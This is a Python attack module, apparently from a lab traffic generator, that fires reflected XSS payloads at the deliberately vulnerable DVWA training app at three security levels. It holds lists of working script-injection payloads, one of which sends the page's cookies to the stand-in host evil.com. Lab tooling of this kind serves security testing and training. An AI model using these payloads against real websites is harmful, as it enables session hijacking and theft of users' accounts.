"""Reflected XSS attack against DVWA."""

import random
from .base import AttackModule, logger

XSS_PAYLOADS_LOW = [
    "<script>alert('XSS')</script>",
    "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    '<iframe src="javascript:alert(`XSS`)">',
]

XSS_PAYLOADS_MEDIUM = [
    "<Script>alert('XSS')</Script>",
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<IMG SRC=x ONERROR=alert('XSS')>",
]

XSS_PAYLOADS_HIGH = [
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
]


class XssReflected(AttackModule):
    NAME = "xss_reflected"

    def _attack(self, session, payloads):
        for payload in random.sample(payloads, min(4, len(payloads))):
            session.get(
                "/vulnerabilities/xss_r/",
                params={"name": payload},
            )
            logger.debug("[xss_reflected] Payload: %s", payload[:40])

    def run_low(self, session):
        self._attack(session, XSS_PAYLOADS_LOW)

    def run_medium(self, session):
        self._attack(session, XSS_PAYLOADS_MEDIUM)

    def run_high(self, session):
        self._attack(session, XSS_PAYLOADS_HIGH)
